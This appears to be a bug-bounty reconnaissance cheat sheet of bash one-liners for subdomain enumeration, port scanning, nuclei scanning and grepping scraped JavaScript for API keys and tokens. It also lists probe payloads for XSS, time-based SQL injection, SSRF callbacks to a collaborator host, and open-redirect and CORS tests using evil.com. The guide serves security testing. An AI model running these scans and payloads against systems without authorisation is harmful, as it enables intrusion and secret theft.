# Recon Automation & One-Liners

## Full Recon Pipeline

```bash
# Complete passive → active recon in one pass
target="target.com"
subfinder -d $target -all -silent | anew subs.txt
amass enum -passive -d $target -silent | anew subs.txt
assetfinder --subs-only $target -silent | anew subs.txt
# Resolve and probe
cat subs.txt | dnsx -silent -a -cname -resp -o resolved.txt
cat subs.txt | httpx -silent -title -status-code -tech-detect -follow-redirects -o http_metadata.txt
# Port scan top services
cat subs.txt | naabu -top-ports 1000 -silent -o ports.txt
# Screenshot all live
cat subs.txt | httpx -silent -screenshot -screenshot-dir shots/
# Nuclei scan
cat subs.txt | nuclei -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt
# JavaScript extraction
cat subs.txt | httpx -silent | subjs | sort -u > js_files.txt
cat js_files.txt | while read url; do curl -s "$url" >> bundle.js; done
# Secret detection
cat bundle.js | grep -oP '(?:api[Kk]ey|apikey|api_key|secret|token)["'\s]*[:=]\s*["'"'"'][^"'"'"']+' | sort -u
```

## Targeted One-Liners

### XSS Automation
```bash
gospider -s https://target.com -d 2 | grep -oP 'https?://[^?]+?=[^&\s]+' | sort -u |   qsreplace '"><img src=x onerror=alert(1)>' | while read url; do curl -s "$url" 2>&1 | grep -q "alert(1)" && echo "$url"; done
```

### Open Redirect Discovery
```bash
cat subs.txt | httpx -silent -path "/?url=https://evil.com" -status-code -follow-redirects |   grep -E "(evil\.com|Location:.*evil\.com)"
```

### SSRF Parameter Testing
```bash
# Identify parameters that fetch URLs
cat bundle.js | grep -oP '["'"'"'](url|uri|path|redirect|return|next|dest|location|target|href)["'"'"']' | sort -u
# Test with collaborator
for param in url uri path redirect return next dest location target href; do
  curl -s "https://target.com/api/proxy?$param=http://collaborator.oastify.com/" -o /dev/null -w "%{http_code}:$param\n"
done
```

### SQLi Quick Scan
```bash
cat subs.txt | httpx -silent -path "/?id=1'" -status-code | grep -v "200"
cat subs.txt | while read url; do
  time curl -s -o /dev/null -w "%{time_total}" "$url/?id=1' OR SLEEP(5)-- -" &
done
```

### CORS Testing
```bash
cat subs.txt | while read url; do
  curl -sI -H "Origin: https://evil.com" "$url" | grep -i "access-control-allow-origin"
done
```

### Heartbeat Monitoring for New Subdomains
```bash
# Daily cron to detect new subdomains
diff <(cat yesterday.txt | sort) <(subfinder -d target.com -silent | tee today.txt | sort) | grep "^>" | mail -s "New subdomains" you@example.com
```

## Notifications & Alerting

```bash
# Setup webhook-based alerts for priority findings
cat nuclei_results.txt | grep -E "critical|high" | while read line; do
  curl -X POST https://hooks.slack.com/services/YOUR/WEBHOOK     -H "Content-Type: application/json"     -d "{"text":"$line"}"
done
```

## Memory & Performance Tips

- Use `puredns` instead of `massdns` for more stable wildcard filtering
- Use `anew` for deduplication throughout pipelines
- Split large wordlists: `split -l 100000 big.txt chunk_`
- Use `timeout` to prevent hanging on slow endpoints
- For massive scans, use `interlace` for multi-threaded execution
